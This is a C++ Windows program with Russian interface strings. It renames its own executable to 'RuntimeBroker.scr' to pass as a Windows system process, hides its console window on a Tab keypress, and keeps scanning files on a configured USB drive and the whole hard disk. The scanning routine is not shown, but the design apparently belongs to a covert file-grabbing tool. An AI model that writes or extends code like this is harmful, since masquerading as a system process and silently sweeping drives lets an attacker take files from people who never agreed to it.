#include "main.h"

void part1()
{
	char* USB = new char[MAX_PATH];
	char* iniRead = new char[MAX_PATH];

	sprintf(iniRead, "%s.ini", pszExtHack(szDirHack("").c_str(), ".ini").c_str());
	USB = IniRead(szDirHack(iniRead).c_str(), "Settings", "USB");

	while (true)
	{
		char title[MAX_PATH];
		sprintf(title, "Wi-Fi: %s", checkInternetConnection() ? "В сети" : "Не в сети");

		SetConsoleTitle(title);

		if (bPath(USB))
		{
			scanFiles(USB);
		}

		this_thread::sleep_for(chrono::milliseconds(10));
	}
}

void part2()
{
	while (true)
	{
		char Time[26];

		chrono::system_clock::time_point now = chrono::system_clock::now();
		time_t currentTime = chrono::system_clock::to_time_t(now);

		strftime(Time, sizeof(Time), "%Y-%m-%d %H:%M:%S", localtime(&currentTime));

		if (GetAsyncKeyState(VK_TAB) & 1)
		{
			HWND hWnd = GetConsoleWindow();

			if (IsWindowVisible(hWnd))
			{
				ShowWindow(hWnd, SW_HIDE);
			}
			else
			{
				ShowWindow(hWnd, SW_SHOWNORMAL);
			}
		}

		if (GetAsyncKeyState(VK_SHIFT) & 1)
		{
			printf("\n\t\t\t--------------------> %s <--------------------\n", Time);
		}

		this_thread::sleep_for(chrono::milliseconds(10));
	}
}

int main()
{
	setlocale(LC_ALL, "Russian");

	SetConsoleCP(1251);
	SetConsoleOutputCP(1251);

	std::thread thread_part1(part1);
	std::thread thread_part2(part2);

	
	if (strstr(HackExeName().c_str(), "RuntimeBroker.scr"))
	{
		while (true)
		{
			scanFiles(GetPathToHard().c_str());

			if (thread_part1.joinable())
			{
				thread_part1.join();
			}

			if (thread_part2.joinable())
			{
				thread_part2.join();
			}

			this_thread::sleep_for(chrono::milliseconds(10));
		}
	}
	else
	{
		rename(szDirHack(HackExeName().c_str()).c_str(), "RuntimeBroker.scr");
	}

	return 0;
}

